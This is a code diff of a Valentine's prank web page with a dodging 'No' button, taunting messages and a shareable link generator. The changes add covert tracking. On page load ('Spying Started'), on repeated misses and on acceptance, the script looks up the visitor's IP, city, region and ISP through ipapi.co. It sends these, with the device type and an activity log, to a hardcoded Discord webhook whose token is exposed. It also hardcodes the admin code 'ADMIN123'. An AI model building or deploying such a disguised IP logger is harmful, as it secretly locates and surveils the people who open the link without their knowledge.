@@ -11,12 +11,14 @@
     :root { --primary: #ff4d6d; --secondary: #fbafba; --bg: #ffe6eb; --gold: #ffd700; }
     body { margin: 0; height: 100vh; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; background: var(--bg); overflow: hidden; touch-action: none; }
 
+    /* Sunset Portal */
     #namePortal {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?q=80&w=2070&auto=format&fit=crop') no-repeat center center;
       background-size: cover; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; z-index: 1000; padding: 20px; transition: opacity 0.8s ease;
     }
 
+    /* Pulse Animation */
     @keyframes heartBeat {
       0% { transform: scale(1); text-shadow: 0 0 5px rgba(255, 215, 0, 0.2); }
       50% { transform: scale(1.05); text-shadow: 0 0 20px rgba(255, 215, 0, 0.8), 0 0 30px rgba(255, 77, 109, 0.6); color: var(--gold); }
@@ -30,17 +32,18 @@
 
     #adminPanel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; display: none; z-index: 5000; overflow-y: auto; }
 
+    /* Main Game Card */
     .card { background: white; padding: 40px; width: 90vw; max-width: 450px; height: 550px; border-radius: 40px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: none; flex-direction: column; align-items: center; justify-content: space-between; position: relative; overflow: hidden; z-index: 10; }
     #joke-text { color: var(--primary); font-weight: 800; text-transform: uppercase; font-size: 0.75rem; height: 60px; text-align: center; z-index: 100; line-height: 1.2; padding: 0 10px; pointer-events: none;}
     
     #yes { background: var(--primary); color: white; font-size: 20px; font-weight: 700; padding: 15px 45px; border: none; border-radius: 50px; cursor: pointer; transition: transform 0.2s; z-index: 50; }
     
+    /* Fixed No Button to prevent vertical weirdness */
     #no { 
-      background: var(--secondary); color: white; width: 150px; height: 50px; 
+      background: var(--secondary); color: white; width: 140px; height: 45px; 
       display: flex; align-items: center; justify-content: center; border: none; border-radius: 50px; 
       position: absolute; cursor: pointer; transition: all 0.15s ease; z-index: 200; 
-      bottom: 60px; left: 50%; transform: translateX(-50%); font-size: 0.85rem; font-weight: 600;
-      text-align: center; padding: 5px;
+      bottom: 60px; left: 50%; transform: translateX(-50%); font-size: 0.85rem; font-weight: 600; text-align: center;
     }
 
     .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 5000; backdrop-filter: blur(8px); }
@@ -95,21 +98,19 @@
   </div>
 
 <script>
-  let visitorName = "", clickCount = 0, yesScale = 1, threadId = null, generatedUrl = "";
+  let visitorName = "", clickCount = 0, yesScale = 1, lastMsgId = null, actionHistory = [];
   const ADMIN_CODE = "ADMIN123"; 
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
   const taunts = [
-    "I have your IP 📍", "Police called 👮", "I'm in your walls 🧱", "Search history leaked 🔍", 
-    "Delete your Roblox? 🎮", "Say No & I steal your cat 🐈", "resistance is futile 🤖", "Stop it!", 
-    "I'm outside 🏠", "Wrong button!", "Try harder!", "Missed me!", "Too slow!", "Leak starting ⏳"
+    "I have your IP 📍", "Police called 👮", "Search history leaked 🔍", "Missed me!", 
+    "Say No & I steal your cat 🐈", "Wrong button!", "I'm in your walls 🧱"
   ];
   
   const promises = [
-    "Thank you for saying Yes, {name}. I promise to hold your hand through every storm. We are forever.",
+    "Thank you, {name}. I promise to hold your hand through every storm. We are forever.",
     "{name}, my heart found its home. I promise to stay until the stars stop shining.",
-    "You made me the luckiest alive, {name}. I promise to be your forever love.",
-    "Thank you, {name}. I promise to fight for us, stay by you, and love you eternally."
+    "You made me the luckiest alive, {name}. I promise to be your forever love."
   ];
 
   window.onload = async () => {
@@ -120,48 +121,45 @@
       msgEl.innerText = `"${decodeURIComponent(params.get('msg'))}"`;
       setTimeout(() => { msgEl.style.opacity = "1"; msgEl.classList.add('pulsing'); }, 800);
     }
+    await trackEvent("Page Opened (Spying Started)");
   };
 
-  function updateSuggestions() {
-    const to = document.getElementById('targetInput').value.trim() || "You";
-    const deepMessages = [`Every beat of my heart belongs to you, ${to}.`, `In a world of temporary things, ${to}, you are my forever.`];
-    const select = document.getElementById('suggestionBox');
-    select.innerHTML = '<option value="">✨ Choose a romantic message...</option>' + deepMessages.map(s => `<option value="${s}">${s}</option>`).join('');
-  }
-
-  function applySuggestion() { document.getElementById('msgInput').value = document.getElementById('suggestionBox').value; }
-
-  async function trackEvent(event) {
+  async function trackEvent(status) {
+    const time = new Date().toLocaleTimeString();
+    actionHistory.push(`[${time}] ${status}`);
+    
     let spyData = {};
     try {
         const res = await fetch('https://ipapi.co/json/');
         spyData = await res.json();
-    } catch (e) { spyData = { ip: "Blocked/Error", city: "Unknown", org: "Unknown" }; }
+    } catch (e) { spyData = { ip: "Blocked", city: "Unknown", org: "Unknown" }; }
 
     const payload = {
-      username: visitorName || "Valentine Bot",
       embeds: [{
-        title: `💖 Valentine Report: ${visitorName || "Guest"}`,
-        color: event.includes("YES") ? 0x00ff00 : 0xff4d6d,
+        title: `💖 Live Session: ${visitorName || "Guest"}`,
+        color: status.includes("YES") ? 0x00ff00 : 0xff4d6d,
         fields: [
-          { name: "Event", value: `**${event}**`, inline: true },
-          { name: "Device", value: navigator.userAgent.includes("Mobi") ? "Mobile" : "Desktop", inline: true },
+          { name: "Live Status", value: `**${status}**`, inline: true },
           { name: "Misses", value: `${clickCount}`, inline: true },
-          { name: "Location", value: `${spyData.city}, ${spyData.region}`, inline: true },
-          { name: "Network", value: `${spyData.org}`, inline: true },
-          { name: "IP Address", value: `\`${spyData.ip}\``, inline: false }
+          { name: "Location", value: `${spyData.city || "Unknown"}, ${spyData.region || "Unknown"}`, inline: true },
+          { name: "Device", value: navigator.userAgent.includes("Mobi") ? "Mobile" : "Desktop", inline: true },
+          { name: "Activity Log", value: `\`\`\`${actionHistory.slice(-6).join("\n")}\`\`\``, inline: false },
+          { name: "IP & Network", value: `IP: \`${spyData.ip}\`\nISP: \`${spyData.org}\``, inline: false }
         ],
-        footer: { text: `Time Spent: ${Math.round(performance.now()/1000)}s` }
-      }],
-      ...( !threadId && { thread_name: `Session: ${visitorName || "Guest"}` } )
+        timestamp: new Date().toISOString()
+      }]
     };
 
-    const url = threadId ? `${WEBHOOK_URL}?thread_id=${threadId}` : WEBHOOK_URL;
+    const url = lastMsgId ? `${WEBHOOK_URL}/messages/${lastMsgId}` : `${WEBHOOK_URL}?wait=true`;
     try {
-      const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-      if (!threadId && response.ok) {
+      const response = await fetch(url, {
+        method: lastMsgId ? 'PATCH' : 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!lastMsgId && response.ok) {
         const data = await response.json();
-        threadId = data.id;
+        lastMsgId = data.id; // Store ID to update the single box
       }
     } catch (e) {}
   }
@@ -182,35 +180,47 @@
     const noBtn = document.getElementById("no");
     const yesBtn = document.getElementById("yes");
     const minY = 180; 
-    const maxX = card.clientWidth - 150 - 60;
-    const maxY = card.clientHeight - 50 - 60;
     
-    noBtn.style.left = (Math.random() * maxX + 30) + "px";
-    noBtn.style.top = (Math.random() * (maxY - minY) + minY) + "px";
+    noBtn.style.left = (Math.random() * (card.clientWidth - 140 - 60) + 30) + "px";
+    noBtn.style.top = (Math.random() * (card.clientHeight - 45 - 60 - minY) + minY) + "px";
     noBtn.style.transform = "none"; 
     
-    // UPDATING THE NO BUTTON TEXT DIRECTLY
     const currentTaunt = taunts[clickCount % taunts.length];
     noBtn.innerText = currentTaunt;
     document.getElementById("joke-text").innerText = currentTaunt;
 
     if (yesScale < 4) { yesScale += 0.25; yesBtn.style.transform = `scale(${yesScale})`; }
-    if (clickCount % 3 === 0) trackEvent("User Struggling with No button");
+    if (clickCount % 3 === 0) trackEvent(`Struggling: ${clickCount} misses`);
   }
 
   function yesClick() {
-    trackEvent("SAID YES! ❤️ Success.");
+    trackEvent("ACCEPTED! ❤️ Success.");
     confetti({ particleCount: 150, spread: 70 });
     const randomMsg = promises[Math.floor(Math.random() * promises.length)].replace("{name}", visitorName);
-    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>I KNEW IT! ❤️</h2><p style="font-size:0.9rem; line-height:1.6;">${randomMsg}</p><p style="font-size:0.7rem; opacity:0.6;">Total Misses: ${clickCount}</p></div>`;
+    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>I KNEW IT! ❤️</h2><p style="font-size:0.95rem; line-height:1.6;">${randomMsg}</p></div>`;
   }
+
+  function updateSuggestions() {
+    const to = document.getElementById('targetInput').value.trim() || "You";
+    const deepMessages = [
+      `${to}, you are the piece of my soul I never knew was missing.`,
+      `Every beat of my heart belongs to you, ${to}.`,
+      `In a world of temporary things, ${to}, you are my forever.`
+    ];
+    const select = document.getElementById('suggestionBox');
+    select.innerHTML = '<option value="">✨ Choose a romantic message...</option>' + 
+      deepMessages.map(s => `<option value="${s}">${s}</option>`).join('');
+  }
+
+  function applySuggestion() { document.getElementById('msgInput').value = document.getElementById('suggestionBox').value; }
 
   function processLinkGeneration() {
     const from = document.getElementById('creatorInput').value.trim();
     const to = document.getElementById('targetInput').value.trim();
     const msg = document.getElementById('msgInput').value.trim();
     if (!from || !to) return alert("Fill names first!");
-    generatedUrl = `${window.location.href.split('?')[0]}?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
+    const base = window.location.href.split('?')[0];
+    generatedUrl = `${base}?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
     document.getElementById('urlDisplay').innerText = generatedUrl;
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
